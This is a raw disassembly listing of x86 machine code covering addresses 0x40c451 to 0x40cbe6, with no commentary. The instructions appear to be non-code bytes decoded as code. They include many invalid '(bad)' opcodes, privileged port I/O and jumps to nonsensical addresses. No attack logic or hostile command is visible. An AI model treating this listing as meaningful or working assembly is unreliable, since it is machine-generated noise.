  40c451:	add    BYTE PTR [edx+0x3c],ah
  40c454:	lds    esi,FWORD PTR [ebx+0x76]
  40c457:	scas   eax,DWORD PTR es:[edi]
  40c458:	sub    eax,0xf90dd914
  40c45d:	push   eax
  40c45e:	out    dx,eax
  40c45f:	sub    eax,0x97b5fcad
  40c464:	pushf  
  40c465:	imul   DWORD PTR [esi-0x5e375871]
  40c46b:	cmp    edi,DWORD PTR [esi]
  40c46d:	adc    al,0xe7
  40c46f:	xor    BYTE PTR [eax],0x6
  40c472:	popf   
  40c473:	(bad)  
  40c475:	push   eax
  40c476:	(bad)  
  40c477:	(bad)  
  40c479:	test   BYTE PTR [ebp+0x7cc5a0ce],bl
  40c47f:	inc    ebp
  40c480:	les    edx,FWORD PTR [ebx]
  40c482:	jmp    0x6d3890ac
  40c487:	inc    ebp
  40c488:	les    edx,FWORD PTR [ebx]
  40c48a:	fstp   DWORD PTR ds:0xf945f7cc
  40c490:	ins    DWORD PTR es:[edi],dx
  40c491:	test   eax,0x30669a54
  40c496:	xchg   cl,ch
  40c498:	jb     0x40c4ea
  40c49a:	jle    0x40c479
  40c49c:	push   esi
  40c49d:	xor    BYTE PTR [esi+0x7e3862e9],al
  40c4a3:	fisttp QWORD PTR [edi+0x24]
  40c4a6:	sub    al,0xce
  40c4a8:	(bad)
  40c4ac:	or     al,0xfc
  40c4ae:	call   0x40c8cf
  40c4b3:	or     edx,DWORD PTR [esi]
  40c4b5:	daa    
  40c4b6:	test   eax,0xdf93ce0c
  40c4bb:	push   ebp
  40c4bc:	bound  edi,QWORD PTR [ebx-0x6c319621]
  40c4c2:	fbld   TBYTE PTR [ebp+0x62]
  40c4c5:	mov    bl,0xdf
  40c4c7:	pop    ecx
  40c4c8:	shl    DWORD PTR [edi],0xaa
  40c4cb:	in     al,0xcd
  40c4cd:	sub    cl,BYTE PTR [edi-0x17]
  40c4d0:	mov    esp,0x58723762
  40c4d5:	sar    ebx,cl
  40c4d7:	arpl   cx,bx
  40c4d9:	out    0x76,eax
  40c4db:	(bad)  
  40c4dd:	aam    0xa8
  40c4df:	mov    esp,0x6a2ecf28
  40c4e4:	shl    DWORD PTR [eax+0x2],0x62
  40c4e8:	fldenv [ebx-0x3d]
  40c4eb:	xor    edx,ebp
  40c4ed:	add    BYTE PTR [esp+edx*1-0x3a],ah
  40c4f1:	sti    
  40c4f2:	scas   al,BYTE PTR es:[edi]
  40c4f3:	retf   0xd8b5
  40c4f6:	and    BYTE PTR [edi-0x27],0x84
  40c4fa:	test   eax,0xa931d535
  40c4ff:	mov    eax,0xcaa1819a
  40c504:	mov    al,ds:0xddd568c1
  40c509:	add    ch,cl
  40c50b:	popa   
  40c50c:	sub    dl,BYTE PTR [edi+ebx*1-0x4d]
  40c510:	aas    
  40c511:	add    bl,BYTE PTR [ebp+eax*4-0xb]
  40c515:	adc    al,0xc6
  40c517:	add    BYTE PTR [edi+0x4f],ch
  40c51a:	pop    ebx
  40c51b:	rol    DWORD PTR [eax+0x41e5e932],cl
  40c521:	fiadd  DWORD PTR [eax]
  40c523:	(bad)  
  40c524:	mov    eax,0x67bf8bd6
  40c529:	sbb    al,0x74
  40c52b:	dec    ebp
  40c52c:	lea    esp,cs:[esi+0x60]
  40c530:	pop    ebp
  40c531:	cmc    
  40c532:	push   ss
  40c533:	bound  edx,QWORD PTR [ebp+0x61eb2cf8]
  40c539:	fld    DWORD PTR [ecx+0x73da05a1]
  40c53f:	in     al,dx
  40c540:	jle    0x40c57e
  40c542:	or     DWORD PTR [edx],eax
  40c544:	pop    edi
  40c545:	or     bh,dh
  40c547:	je     0x40c576
  40c549:	cmc    
  40c54a:	sbb    BYTE PTR [ecx-0x17e1b337],bl
  40c550:	popa   
  40c551:	sub    DWORD PTR [ebp+eiz*4+0x7450e4b5],ecx
  40c558:	dec    esp
  40c559:	test   BYTE PTR [ecx+ebp*8],0x61
  40c55d:	sub    esi,edi
  40c55f:	cld    
  40c560:	sub    edi,esp
  40c562:	inc    eax
  40c563:	jmp    0xb5524a
  40c568:	push   0x52
  40c56a:	inc    edx
  40c56b:	and    al,0xc3
  40c56d:	sub    dh,bh
  40c56f:	adc    eax,0x40e8fb
  40c574:	add    BYTE PTR [ebp-0x1f60bb74],al
  40c57a:	cmp    eax,esi
  40c57c:	add    BYTE PTR [edi+0x21],ch
  40c57f:	mov    ch,BYTE PTR [edi+ebp*4-0x74000054]
  40c586:	dec    edi
  40c587:	call   0xf000:0xda9324
  40c58e:	add    BYTE PTR [edx+0x7d52d5c3],0x2
  40c595:	jecxz  0x40c5bb
  40c597:	inc    esp
  40c598:	add    DWORD PTR [ebx],edi
  40c59a:	pop    ecx
  40c59b:	mov    ebp,0xc8c86678
  40c5a0:	push   ecx
  40c5a1:	cli    
  40c5a2:	es push esi
  40c5a4:	push   eax
  40c5a5:	in     eax,dx
  40c5a6:	and    al,0x50
  40c5a8:	dec    DWORD PTR [esi]
  40c5aa:	push   esp
  40c5ab:	cmovo  edi,DWORD PTR [ebx]
  40c5ae:	pop    ecx
  40c5af:	mov    ebp,0xda5a627e
  40c5b4:	jle    0x40c5ea
  40c5b6:	pop    eax
  40c5b7:	jns    0x40c5c0
  40c5b9:	inc    esp
  40c5ba:	aad    0x74
  40c5bc:	or     BYTE PTR [eax],al
  40c5be:	xchg   edi,eax
  40c5bf:	jl     0x40c5db
  40c5c1:	dec    ebp
  40c5c2:	fld    DWORD PTR ds:0x68d9e100
  40c5c8:	jo     0x40c54a
  40c5ca:	adc    eax,0xe8e45501
  40c5cf:	pop    esp
  40c5d0:	push   ss
  40c5d1:	or     ebx,eax
  40c5d3:	xor    eax,eax
  40c5d5:	dec    eax
  40c5d6:	cdq    
  40c5d7:	or     DWORD PTR [eax-0x50],eax
  40c5da:	fnstenv [ecx]
  40c5dc:	rol    BYTE PTR [ebx+edx*1+0x62005b5c],0x41
  40c5e4:	mov    esi,0x1c2600f
  40c5e9:	ret    
  40c5ea:	jno    0x40c56e
  40c5ec:	inc    ecx
  40c5ed:	ret    
  40c5ee:	jno    0x40c572
  40c5f0:	ret    0xe954
  40c5f3:	xchg   ebp,eax
  40c5f4:	sub    bl,0x56
  40c5f7:	out    dx,eax
  40c5f8:	jns    0x40c656
  40c5fa:	outs   dx,BYTE PTR ds:[esi]
  40c5fb:	or     al,0x4e
  40c5fd:	push   ebx
  40c5fe:	test   esp,esp
  40c600:	or     al,0x33
  40c602:	jge    0x40c60e
  40c604:	dec    esi
  40c605:	(bad)  
  40c606:	out    dx,eax
  40c607:	mov    ecx,0x526c3299
  40c60c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c60d:	mov    dh,BYTE PTR [edx+0x3e]
  40c610:	mov    esi,0x2e4ae713
  40c615:	ins    DWORD PTR es:[edi],dx
  40c616:	loope  0x40c652
  40c618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c619:	jae    0x40c5d5
  40c61b:	inc    edi
  40c61c:	hlt    
  40c61d:	mov    WORD PTR [edi+0x73ff4ff4],gs
  40c623:	and    edx,DWORD PTR [ecx]
  40c625:	adc    BYTE PTR [eax-0x80],dl
  40c628:	add    DWORD PTR [ebp-0x750971de],eax
  40c62e:	(bad)  
  40c62f:	mov    eax,0xf30acd7a
  40c634:	test   al,0xfe
  40c636:	adc    eax,0xf9feba40
  40c63b:	jnp    0x40c6b5
  40c63d:	inc    esp
  40c63e:	or     dl,BYTE PTR [ecx-0x6ee5bb88]
  40c644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c645:	adc    al,0x0
  40c647:	jp     0x40c617
  40c649:	inc    ecx
  40c64a:	add    bh,ah
  40c64c:	add    BYTE PTR [esi],ch
  40c64e:	adc    ch,ah
  40c650:	inc    ebp
  40c651:	adc    cl,BYTE PTR [ebp+0x74a3c827]
  40c657:	data16 jo 0x40c600
  40c65a:	adc    al,0x36
  40c65c:	fyl2xp1 
  40c65e:	inc    ebx
  40c65f:	bound  ebx,QWORD PTR [esi+0x24]
  40c662:	shr    al,0x1c
  40c665:	cld    
  40c666:	adc    BYTE PTR [ebp+0x627b45f2],0x56
  40c66d:	inc    edx
  40c66e:	add    BYTE PTR [ebx+0x44],ah
  40c671:	jmp    0x40c6eb
  40c673:	sbb    cl,ah
  40c675:	addr16 and eax,0xfc34d86e
  40c67b:	pop    esi
  40c67c:	pop    ecx
  40c67d:	out    0x3,eax
  40c67f:	bound  esi,QWORD PTR [ebx]
  40c681:	jno    0x40c686
  40c683:	jmp    0x1986fd1b
  40c688:	mov    al,ds:0xbdd94faa
  40c68d:	push   0xe7d75d98
  40c692:	add    esi,DWORD PTR [ecx+0x7023d45e]
  40c698:	sbb    eax,ebp
  40c69a:	dec    ebp
  40c69b:	fld    DWORD PTR [ebx-0x10]
  40c69e:	dec    esp
  40c69f:	mov    edx,0x62448345
  40c6a4:	and    esp,DWORD PTR [ebx-0x55]
  40c6a7:	xor    al,0xa6
  40c6a9:	les    eax,FWORD PTR fs:[eax]
  40c6ac:	mov    dh,0xf0
  40c6ae:	jb     0x40c6ed
  40c6b0:	pop    edx
  40c6b1:	aam    0xdd
  40c6b3:	add    DWORD PTR [edx-0x27],esp
  40c6b6:	xchg   edi,eax
  40c6b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6b8:	mov    ds,ebp
  40c6ba:	cs psrad mm4,mm6
  40c6be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6bf:	add    edx,edx
  40c6c1:	xlat   BYTE PTR ds:[ebx]
  40c6c2:	adc    BYTE PTR [ecx-0x3],bh
  40c6c5:	leave  
  40c6c6:	out    0x1b,eax
  40c6c8:	jp     0x40c738
  40c6ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6cb:	add    edx,DWORD PTR [edx+ecx*8+0x43a57f1a]
  40c6d2:	lock js 0x40c6f9
  40c6d5:	loope  0x40c6d7
  40c6d7:	push   0xffffff9e
  40c6d9:	jecxz  0x40c6c4
  40c6db:	adc    ch,BYTE PTR [eax-0x29]
  40c6de:	push   0x109db59
  40c6e3:	aaa    
  40c6e4:	pop    es
  40c6e5:	in     eax,0xc8
  40c6e7:	cli    
  40c6e8:	and    ecx,ebx
  40c6ea:	sub    DWORD PTR [ecx-0x507dc984],0x63
  40c6f1:	pop    esi
  40c6f2:	into   
  40c6f3:	shl    DWORD PTR [ebp+0x15],1
  40c6f6:	add    cl,ch
  40c6f8:	adc    al,0x8a
  40c6fa:	js     0x40c710
  40c6fc:	sti    
  40c6fd:	aad    0xff
  40c6ff:	call   0x6ccced65
  40c704:	leave  
  40c705:	int3   
  40c706:	std    
  40c707:	xchg   esi,eax
  40c708:	adc    BYTE PTR [ecx],ch
  40c70a:	push   edi
  40c70b:	fidivr DWORD PTR [edi+0x865723]
  40c711:	push   esp
  40c712:	ror    DWORD PTR [edi],1
  40c714:	sub    DWORD PTR [esi+0x5e],esp
  40c717:	shl    bh,0x49
  40c71a:	aas    
  40c71b:	cmp    BYTE PTR ds:0x66fbcf8c,dh
  40c721:	dec    BYTE PTR [edi+ecx*1+0x22]
  40c725:	and    eax,DWORD PTR [esi+0x2b]
  40c728:	sbb    bh,cl
  40c72a:	mov    BYTE PTR ds:[ebp+0x6c],bl
  40c72e:	sar    ebx,0x46
  40c731:	(bad)  
  40c732:	push   ebx
  40c733:	push   ebp
  40c734:	icebp  
  40c735:	call   0xfbd0:0x94640d15
  40c73c:	cs (bad) 
  40c73e:	sbb    BYTE PTR [eax+0xdd272b],al
  40c744:	jmp    0x17355b22
  40c749:	mov    esi,0x6cdec05d
  40c74e:	cmp    dh,bh
  40c750:	add    BYTE PTR [ebp+edi*2+0x2f],bl
  40c754:	sar    ah,0x1e
  40c757:	pop    edx
  40c758:	leave  
  40c759:	mov    esp,eax
  40c75b:	std    
  40c75c:	push   edx
  40c75d:	hlt    
  40c75e:	inc    ecx
  40c75f:	stc    
  40c760:	xor    esp,DWORD PTR [eax-0x33fba15a]
  40c766:	push   ecx
  40c767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c768:	add    bl,cl
  40c76a:	fsubr  QWORD PTR [eax+0x7c]
  40c76d:	xor    BYTE PTR ds:0xf886ff01,bl
  40c773:	adc    al,BYTE PTR [eax+0x0]
  40c776:	mov    edx,DWORD PTR [ebp+0x6]
  40c779:	test   ebx,ecx
  40c77b:	in     al,dx
  40c77c:	test   BYTE PTR [edx+0x6800dc7b],dl
  40c782:	and    edx,esi
  40c784:	add    BYTE PTR [eax],al
  40c786:	push   ecx
  40c787:	aad    0xfd
  40c789:	xor    eax,0x44fc43
  40c78e:	fadd   st(2),st
  40c790:	stc    
  40c791:	adc    BYTE PTR [ebx],bh
  40c793:	fld    QWORD PTR [edi-0x42aeacb9]
  40c799:	je     0x40c7f8
  40c79b:	add    ecx,DWORD PTR [edx+0x3dce0b35]
  40c7a1:	add    BYTE PTR [ebx],dh
  40c7a3:	push   eax
  40c7a4:	fwait
  40c7a5:	inc    eax
  40c7a6:	dec    ebx
  40c7a7:	jnp    0x40c7df
  40c7a9:	push   DWORD PTR [ebp+0x58]
  40c7ac:	dec    esi
  40c7ad:	or     BYTE PTR [ebx],ah
  40c7af:	cmp    al,0x9b
  40c7b1:	inc    eax
  40c7b2:	cmp    edx,DWORD PTR [ebp+0x40]
  40c7b5:	add    al,0x5c
  40c7b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7b8:	(bad)  
  40c7b9:	(bad)  
  40c7ba:	sub    BYTE PTR [ecx+ecx*1],0x68
  40c7be:	(bad)
  40c7c2:	xchg   edx,eax
  40c7c3:	push   ds
  40c7c4:	or     edi,edi
  40c7c6:	adc    al,0x7b
  40c7c8:	ror    DWORD PTR [ebx+0x68097f62],cl
  40c7ce:	scas   al,BYTE PTR es:[edi]
  40c7cf:	dec    edx
  40c7d0:	inc    ebp
  40c7d1:	add    bl,bl
  40c7d3:	jo     0x40c7e2
  40c7d5:	call   DWORD PTR [ebp+0x8ab7c7]
  40c7db:	and    eax,0x23893fba
  40c7e0:	mov    ds:0xf95a4e8e,al
  40c7e5:	cmp    eax,DWORD PTR [esi+esi*1]
  40c7e8:	(bad)  
  40c7ea:	pop    eax
  40c7eb:	push   0x26
  40c7ed:	clc    
  40c7ee:	cmp    BYTE PTR [ebx],cl
  40c7f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7f1:	adc    eax,0xf4f96b10
  40c7f6:	jae    0x40c861
  40c7f8:	jg     0x40c844
  40c7fa:	add    al,0x63
  40c7fc:	mov    dl,0x1
  40c7fe:	add    dl,dl
  40c800:	mov    al,0xae
  40c802:	adc    edi,DWORD PTR [edx-0x6a]
  40c805:	xor    DWORD PTR [edx],eax
  40c807:	bound  ecx,QWORD PTR [ecx+0x43]
  40c80a:	or     BYTE PTR [ebp-0x5a],dh
  40c80d:	mov    ds:0x41c3fa14,al
  40c812:	add    bl,bl
  40c814:	mov    esi,0xfbbdbfd3
  40c819:	lds    edx,FWORD PTR [ebp-0x17]
  40c81c:	inc    ecx
  40c81d:	cmp    ecx,DWORD PTR [ebx+0x2608b8a4]
  40c823:	pop    esi
  40c824:	mov    al,0x1
  40c826:	push   eax
  40c827:	std    
  40c828:	mov    esp,0x87620004
  40c82d:	mov    ds:0x41c2b614,al
  40c832:	add    bh,bl
  40c834:	lock sbb BYTE PTR [edi],al
  40c837:	push   eax
  40c838:	lock lods al,BYTE PTR ds:[esi]
  40c83a:	clc    
  40c83b:	bound  esi,QWORD PTR [eax-0x63ff74ff]
  40c841:	mov    eax,0xd93e73a2
  40c846:	repz test BYTE PTR [edx],ah
  40c849:	call   0x52a2cc37
  40c84e:	ds stos DWORD PTR es:[edi],eax
  40c850:	clc    
  40c851:	sbb    ebp,ecx
  40c853:	add    ebx,edi
  40c855:	cdq    
  40c856:	jl     0x40c7fc
  40c858:	call   0xd49db87c
  40c85d:	(bad)  
  40c85e:	mul    BYTE PTR [ecx]
  40c860:	fist   DWORD PTR [ecx-0x49]
  40c863:	or     DWORD PTR [edx-0x27],esp
  40c866:	jb     0x40c8b2
  40c868:	push   0x2a
  40c86a:	jno    0x40c7f8
  40c86c:	jno    0x40c84d
  40c86e:	out    0x3,eax
  40c870:	fstp   DWORD PTR [edi]
  40c872:	loopne 0x40c848
  40c874:	mov    BYTE PTR [eax+0x5f],dl
  40c877:	fsub   QWORD PTR [edi-0x27]
  40c87a:	out    0x8c,eax
  40c87c:	pop    ds
  40c87d:	sar    edx,1
  40c87f:	retf   0x61da
  40c882:	jmp    0x40c88d
  40c884:	(bad)  
  40c885:	fnstenv [edx+0x4a]
  40c888:	push   0x31
  40c88a:	push   ss
  40c88b:	jge    0x40c8c2
  40c88d:	fldenv [eax+0x7c]
  40c890:	sub    eax,0xd903e7df
  40c895:	pop    ds
  40c896:	lock enter 0x1ddd,0xe6
  40c89b:	add    esp,DWORD PTR [edx-0x28]
  40c89e:	out    0x3,eax
  40c8a0:	bound  edx,QWORD PTR [edx+0x25]
  40c8a3:	or     al,0x0
  40c8a5:	(bad)  [eax-0x51]
  40c8a8:	or     DWORD PTR [edx-0x27],esp
  40c8ab:	jb     0x40c8f7
  40c8ad:	push   0x3f
  40c8af:	popa   
  40c8b0:	mov    WORD PTR [ebp-0x26fc1821],ds
  40c8b6:	push   ds
  40c8b7:	lock mov esi,ebp
  40c8ba:	sub    ah,dh
  40c8bc:	add    esp,DWORD PTR [edx+0x52]
  40c8bf:	add    BYTE PTR [edi-0x19ad23a7],ch
  40c8c5:	popa   
  40c8c6:	fst    DWORD PTR [eax+0x26]
  40c8c9:	cmc    
  40c8ca:	pop    ecx
  40c8cb:	adc    ch,BYTE PTR [ecx-0x1eb9ad9f]
  40c8d1:	aas    
  40c8d2:	fisubr DWORD PTR [eax-0x6b]
  40c8d5:	pushw  es
  40c8d7:	add    esp,ebp
  40c8d9:	xchg   edi,eax
  40c8da:	rol    DWORD PTR [eax],1
  40c8dc:	jmp    0x8d548f72
  40c8e1:	xlat   BYTE PTR ds:[ebx]
  40c8e2:	add    eax,0xd1306201
  40c8e7:	push   esi
  40c8e8:	je     0x40c8ca
  40c8ea:	cmc    
  40c8eb:	push   es
  40c8ec:	jmp    0xa1a9f252
  40c8f1:	adc    al,0x6
  40c8f3:	add    DWORD PTR [ecx+0x31],eax
  40c8f6:	lea    eax,[eax-0x17]
  40c8f9:	dec    ecx
  40c8fa:	inc    edx
  40c8fb:	mov    ah,0x29
  40c8fd:	pop    esi
  40c8fe:	xor    DWORD PTR [edi+0x7c],ebp
  40c901:	and    ecx,ebx
  40c903:	push   0x1062d11
  40c908:	adc    DWORD PTR [eax],eax
  40c90a:	and    al,0x8c
  40c90c:	inc    eax
  40c90d:	jmp    0x29f58d5b
  40c912:	xor    WORD PTR [ebx+ebx*2],bx
  40c916:	and    ecx,ebx
  40c918:	push   0x104b7dd
  40c91d:	ins    BYTE PTR es:[edi],dx
  40c91e:	stos   DWORD PTR es:[edi],eax
  40c91f:	aad    0x68
  40c921:	inc    edx
  40c922:	stos   DWORD PTR es:[edi],eax
  40c923:	add    al,0x1
  40c925:	sbb    DWORD PTR [ebx],eax
  40c927:	sub    al,BYTE PTR ds:0x81d19372
  40c92d:	and    eax,0x61ff520d
  40c932:	xchg   ebx,eax
  40c933:	shl    DWORD PTR [ecx],1
  40c935:	sub    DWORD PTR [eax],ecx
  40c937:	loop   0x40c992
  40c939:	add    BYTE PTR [esp+ecx*2],dl
  40c93c:	mov    esi,0x59ef55f
  40c941:	add    ch,ch
  40c943:	push   ebp
  40c944:	lock mov edi,DWORD PTR [ebp+0x87448dc]
  40c94b:	adc    DWORD PTR [esp+edx*1+0x70],esi
  40c94f:	adc    cl,BYTE PTR [ecx]
  40c951:	adc    DWORD PTR [ebx],0xffffffd9
  40c954:	je     0x40c962
  40c956:	push   esp
  40c957:	test   al,0xfe
  40c959:	push   eax
  40c95a:	mov    ebx,0x2084355
  40c95f:	pop    esi
  40c960:	sbb    eax,0x829df500
  40c965:	in     al,dx
  40c966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c967:	or     eax,0x647c5654
  40c96c:	jno    0x40c992
  40c96e:	add    BYTE PTR [edi+0x50],bl
  40c971:	call   0x13297875
  40c976:	inc    eax
  40c977:	mov    ebx,0xc033f54f
  40c97c:	push   0x4e
  40c97e:	call   DWORD PTR [eax]
  40c980:	push   0xcd5f7488
  40c985:	mov    BYTE PTR [edi+ebx*2-0x3b],bl
  40c989:	cmp    cl,0xc5
  40c98c:	fld    QWORD PTR [eax]
  40c98e:	add    BYTE PTR [ebx+ebx*2-0x2784ff72],al
  40c995:	mov    DWORD PTR [ebp-0x7d],ecx
  40c998:	arpl   WORD PTR [ecx+0x24],si
  40c99b:	sub    edx,DWORD PTR [edi-0x40]
  40c99e:	push   ss
  40c99f:	mov    eax,ds:0x3bffffd1
  40c9a4:	jo     0x40c940
  40c9a6:	inc    ecx
  40c9a7:	cmp    bl,al
  40c9a9:	add    eax,0x1e
  40c9ac:	jmp    0x40ca03
  40c9ae:	dec    DWORD PTR [edi]
  40c9b0:	mov    esp,0x7e628d25
  40c9b5:	in     eax,0x17
  40c9b7:	cmp    bh,dl
  40c9b9:	or     eax,DWORD PTR [eax]
  40c9bb:	bound  eax,QWORD PTR [edi+0x19]
  40c9be:	and    al,0x72
  40c9c0:	lds    esi,FWORD PTR ds:[ebx-0x7d]
  40c9c4:	xor    DWORD PTR [ecx],esp
  40c9c6:	and    al,0x6a
  40c9c8:	mov    dl,0x4
  40c9ca:	add    BYTE PTR [edx+0x7e],ah
  40c9cd:	test   BYTE PTR [edx+0x52e59e8e],0x0
  40c9d4:	xchg   ebp,eax
  40c9d5:	lahf   
  40c9d6:	int3   
  40c9d7:	out    0xb,eax
  40c9d9:	inc    ecx
  40c9da:	add    eax,DWORD PTR [eax]
  40c9dc:	jmp    0xdacbd36d
  40c9e1:	dec    ecx
  40c9e2:	cmp    al,0x14
  40c9e4:	mov    ecx,0x5a448ab8
  40c9e9:	aaa    
  40c9ea:	lahf   
  40c9eb:	lds    esp,FWORD PTR [edx]
  40c9ed:	mov    BYTE PTR [eax*4-0x7512d24b],0x27
  40c9f5:	mov    edx,0x443a0127
  40c9fa:	push   esp
  40c9fb:	aas    
  40c9fc:	bound  ebp,QWORD PTR [edx]
  40c9fe:	push   0xffffffb5
  40ca00:	and    dh,BYTE PTR [edx-0xe2b58d7]
  40ca06:	add    al,0x53
  40ca08:	sub    eax,0x229b1d1a
  40ca0d:	mov    dl,0x9e
  40ca0f:	das    
  40ca10:	jne    0x40ca13
  40ca12:	or     eax,0x8891a683
  40ca17:	mov    edi,0x3ac34d55
  40ca1c:	pop    esp
  40ca1d:	lds    eax,FWORD PTR [esi]
  40ca1f:	mov    esp,DWORD PTR ds:0x604def69
  40ca25:	mov    al,0x8a
  40ca27:	int    0x3a
  40ca29:	mov    eax,0xd962024b
  40ca2e:	(bad)  
  40ca2f:	cmp    eax,0x3a2a4f97
  40ca34:	loope  0x40c9d3
  40ca36:	jecxz  0x40c9f9
  40ca38:	add    BYTE PTR [ebp-0x27],bl
  40ca3b:	mov    ah,0x8a
  40ca3d:	or     DWORD PTR [edi-0x54],ecx
  40ca40:	psubsw mm5,QWORD PTR [eax+esi*8]
  40ca44:	test   cl,bh
  40ca46:	shr    ecx,1
  40ca48:	add    esp,DWORD PTR [edx+0x56]
  40ca4b:	daa    
  40ca4c:	out    dx,eax
  40ca4d:	xchg   edi,eax
  40ca4e:	dec    esi
  40ca4f:	sbb    BYTE PTR [ebx],dh
  40ca51:	out    0x54,eax
  40ca53:	pop    ds
  40ca54:	mov    al,ds:0xcaffc2ec
  40ca59:	bnd ret 0x880e
  40ca5d:	sbb    eax,0x1f8ae74e
  40ca62:	aad    0x6c
  40ca64:	nop
  40ca65:	aad    0xc4
  40ca67:	neg    BYTE PTR [ebp+0x33a8ddd6]
  40ca6d:	jmp    0x5e8f3d0a
  40ca72:	sub    eax,edx
  40ca74:	xchg   ebx,eax
  40ca75:	scas   eax,DWORD PTR es:[edi]
  40ca76:	ret    0x88d6
  40ca79:	in     eax,0x4d
  40ca7b:	jmp    0x40ca19
  40ca7d:	daa    
  40ca7e:	sar    edx,1
  40ca80:	ret    
  40ca81:	aaa    
  40ca82:	nop
  40ca83:	test   eax,0xa806620c
  40ca88:	inc    esp
  40ca89:	mov    al,ds:0xe936e7d5
  40ca8e:	mov    ch,0x6a
  40ca90:	mov    al,0x45
  40ca92:	es ss xor eax,0x10019e31
  40ca99:	xlat   BYTE PTR ds:[ebx]
  40ca9a:	sbb    al,0xac
  40ca9c:	xor    DWORD PTR [eax],eax
  40ca9e:	mov    dl,0x4e
  40caa0:	or     DWORD PTR [ecx-0x4be3afae],0x9d0123da
  40caaa:	fldenv [ecx+ebx*8]
  40caad:	outs   dx,BYTE PTR ds:[esi]
  40caae:	xor    eax,0x61a91736
  40cab3:	push   esi
  40cab4:	(bad)  
  40cab5:	in     eax,dx
  40cab6:	fcom   QWORD PTR [ecx+edx*8]
  40cab9:	pusha  
  40caba:	gs mov cl,0xe8
  40cabd:	add    dl,0xc2
  40cac0:	std    
  40cac1:	ins    DWORD PTR es:[edi],dx
  40cac2:	push   ds
  40cac3:	inc    esi
  40cac4:	jae    0x40ca5e
  40cac6:	push   esi
  40cac7:	push   esp
  40cac8:	dec    ebx
  40cac9:	sbb    DWORD PTR [esi-0x20d103d7],esi
  40cacf:	push   ebp
  40cad0:	rcr    BYTE PTR [ebp-0x1a81b1c3],0xdc
  40cad7:	sbb    al,0xd1
  40cad9:	mov    esi,0x21ed1d1e
  40cade:	pop    ebx
  40cadf:	add    al,BYTE PTR [ecx]
  40cae1:	jo     0x40cb00
  40cae3:	leave  
  40cae4:	xchg   DWORD PTR [ebp+esi*8-0x2c86ec3e],ebx
  40caeb:	add    DWORD PTR [ecx],eax
  40caed:	pusha  
  40caee:	and    eax,0x4da983c1
  40caf3:	aad    0x66
  40caf5:	push   0x4d
  40caf7:	sbb    bh,bh
  40caf9:	xor    eax,0x6040dd4a
  40cafe:	and    al,0xc1
  40cb00:	std    
  40cb01:	aas    
  40cb02:	add    BYTE PTR [edx+0x54],ch
  40cb05:	inc    ebx
  40cb06:	int    0xda
  40cb08:	xchg   ebx,eax
  40cb09:	xchg   edi,ebp
  40cb0b:	mov    ecx,0x61ebada5
  40cb10:	add    BYTE PTR [ebp+ebx*4+0x4f],bl
  40cb14:	in     eax,0x89
  40cb16:	and    al,0xae
  40cb18:	cmp    DWORD PTR [edx+0x68d9215f],ebp
  40cb1e:	inc    esi
  40cb1f:	mov    bh,0x0
  40cb21:	add    DWORD PTR [eax],eax
  40cb23:	js     0x40cb83
  40cb25:	sub    eax,0x81e96bff
  40cb2a:	les    ebp,FWORD PTR [ebx]
  40cb2c:	pop    eax
  40cb2d:	mov    ebp,0x12a4974
  40cb32:	mov    DWORD PTR [esi],0xfb9bd571
  40cb38:	fmul   QWORD PTR [ebx+0x7746b4d]
  40cb3e:	(bad)  
  40cb3f:	lods   al,BYTE PTR ds:[esi]
  40cb40:	pop    ebp
  40cb41:	mov    al,BYTE PTR [ebp+0x77]
  40cb44:	adc    al,0x75
  40cb46:	add    edx,ebx
  40cb48:	out    0x8,eax
  40cb4a:	mov    edi,DWORD PTR [esi-0x20131a7c]
  40cb50:	fiadd  DWORD PTR [eax]
  40cb52:	cmp    DWORD PTR [esi-0xd8c0274],0x5d
  40cb59:	je     0x40cb2b
  40cb5b:	dec    esp
  40cb5c:	(bad)  
  40cb5d:	adc    cl,BYTE PTR gs:[ebx]
  40cb60:	fstp   QWORD PTR [ebp+0x5e]
  40cb63:	push   ecx
  40cb64:	cdq    
  40cb65:	pop    edx
  40cb66:	leave  
  40cb67:	add    BYTE PTR [ecx-0x28],bh
  40cb6a:	add    BYTE PTR [ecx+0x3c85f],al
  40cb70:	retf   
  40cb71:	or     DWORD PTR [esi+edx*2+0x74],edx
  40cb75:	out    dx,eax
  40cb76:	adc    BYTE PTR [ebx+0x6ad74f92],cl
  40cb7c:	mov    ebx,0x675c8909
  40cb81:	(bad)  
  40cb82:	(bad)  
  40cb83:	adc    eax,0x3dcb27
  40cb88:	clc    
  40cb89:	cwde   
  40cb8a:	or     DWORD PTR [eax+esi*8-0x874c616],eax
  40cb91:	mov    eax,0xdc8b0625
  40cb96:	xor    esi,0x57
  40cb99:	scas   al,BYTE PTR es:[edi]
  40cb9a:	mov    bh,BYTE PTR [edx+eiz*2+0x6205e58e]
  40cba1:	mov    dl,0x80
  40cba3:	dec    dh
  40cba5:	mov    eax,0x6fd9d68e
  40cbaa:	lods   al,BYTE PTR ds:[esi]
  40cbab:	test   eax,0x8b01b108
  40cbb0:	sbb    dh,BYTE PTR ds:0x4b657dbe
  40cbb6:	mov    dl,0x8a
  40cbb8:	sbb    al,0x2a
  40cbba:	mov    cl,0x4b
  40cbbc:	pusha  
  40cbbd:	mov    dl,0x8e
  40cbbf:	out    dx,eax
  40cbc0:	out    0x27,eax
  40cbc2:	adc    BYTE PTR [edi+0x51],al
  40cbc5:	repnz stos DWORD PTR es:[edi],eax
  40cbc7:	lods   al,BYTE PTR ds:[esi]
  40cbc8:	bound  esi,QWORD PTR [edx-0x33fff0ff]
  40cbce:	repnz dec esp
  40cbd0:	je     0x40cc3a
  40cbd2:	jp     0x40cbe4
  40cbd4:	lock mov ebx,0x62000508
  40cbda:	jmp    0x40cbdb
  40cbdc:	mov    eax,0x1b218
  40cbe1:	out    dx,eax
  40cbe2:	test   ebp,ebx
  40cbe4:	adc    ecx,edx
  40cbe6:	out    0xbf,eax
